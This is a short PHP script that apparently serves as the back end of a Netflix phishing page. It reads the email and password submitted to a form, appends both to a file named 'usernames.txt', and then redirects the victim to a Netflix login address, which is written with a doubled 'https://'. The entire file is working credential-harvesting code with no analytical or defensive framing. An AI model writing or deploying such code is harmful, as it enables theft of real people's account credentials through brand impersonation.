<?php

file_put_contents("usernames.txt", "Netflix Username: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://https://www.netflix.com/ve/login');
exit();
?>
